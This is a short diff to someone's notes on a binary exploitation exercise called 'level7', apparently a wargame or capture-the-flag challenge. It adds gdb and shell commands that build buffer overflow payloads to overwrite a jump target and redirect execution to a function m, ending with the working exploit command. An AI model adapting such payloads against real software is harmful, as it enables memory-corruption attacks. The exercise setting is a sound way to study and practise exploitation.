@@ -24,3 +24,9 @@ r $(python -c "print 'A'*20 + '\x3c\xa0\x04\x08'") $(python -c "print 'b'*3")
 
 #trying to change eip : at 0xbffff71c => \x2c\xf7\xff\xbf by m address : 0x080484f4 => \xf4\x84\x04\x08
 r $(python -c "print 'A'*20 + '\x1c\xf7\xff\xbf'") $(python -c "print '\xf4\x84\x04\x08'")
+
+#try to change jmp towards put to m : jmp 0x8049928 => jmp 0x080484f4
+r $(python -c "print 'A'*20 + '\x28\x99\x04\x08'") $(python -c "print '\xf4\x84\x04\x08'")
+it works! Try it in shell and we got it
+
+./level7 $(python -c "print 'A'*20 + '\x28\x99\x04\x08'") $(python -c "print '\xf4\x84\x04\x08'")
